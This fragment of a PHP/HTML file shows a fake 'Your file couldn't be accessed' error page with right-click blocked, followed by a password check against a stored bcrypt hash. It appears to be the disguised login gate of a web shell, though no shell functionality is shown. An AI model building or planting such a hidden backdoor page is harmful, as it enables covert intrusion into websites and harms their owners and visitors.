    ...
    <body oncontextmenu="return false;">
        <div class="error-container">
            <div class="error-message">
                <h1>Your file couldn't be accessed</h1>
...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$JOlAgYr.wIYcsu9CSoKOQO5X4t37aUcdaR5zMZ.aLLhXuUTCwDtX.'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda
